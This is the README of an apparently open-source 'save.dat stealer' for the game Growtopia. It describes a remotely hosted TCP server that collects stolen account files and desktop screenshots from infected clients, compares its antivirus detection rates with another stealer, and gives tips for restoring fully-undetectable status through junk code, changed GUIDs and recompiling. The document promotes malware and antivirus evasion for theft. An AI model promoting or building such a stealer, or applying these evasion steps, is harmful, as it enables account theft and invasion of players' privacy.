# GrowtopiaSaveForwarder
Remotely Host (A TCP Server for your spreaded clients) and Manage a professional save.dat stealer with extra features.
This is an open source project!
SaveForwarder made by playingo/DEERUX - YT: https://youtube.com/channel/UCeepWySm91lV99AuO4IvQlA
Detection of AV's comparasion between H4f's save forwarder and my DIY save forwader 
``My stealer: (remember that I have used virustotal and released the source of this and FUD might be gone):``
https://imgur.com/a/gP5Ryuy [Direct Virustotal link:
https://www.virustotal.com/gui/file/284f7b0c6d601c0ad053673df5daea771f248c1b0ee15364263a555dba2063cc/detection]

``Hack4Fun's stealer (binded with GABB, but the stealer is still contained as it is a binded executable, couldn't find any other ones but still shouldn't affect the detection too much): ``https://www.virustotal.com/gui/file/3ff369c72811b085d5fca439b77c3aac61a62be990b60e9cebe27d325aeddf48/detection

REMINDER: "ChattuyCS" is the client, and "Chattuy Server" the saveforwarder server. (initially used to be a chat server/client written by me)

REMINDER: This is undone code (beta).

REMINDER: If FUD expires, add a little junk code into the code, change assembly data (important: change guid) and re compile, it may lower the detection. An additional way to gain fud is to recode some parts or use unique/different functions and using different ways of gathering hardware information than the current source does. So basically modifying it decently/a lot = success to fud.

Known bugs:
- Image/Screenshot of desktop appears to be corrupted at some times.
- Memory usage related stuff, not sure, garbage collector should handle this at some point.
- "bug" Currently only handles a max of 256 unique users having their own folder as I literally use one byte to determine to which person the stolen content belongs to, didn't care about changing.
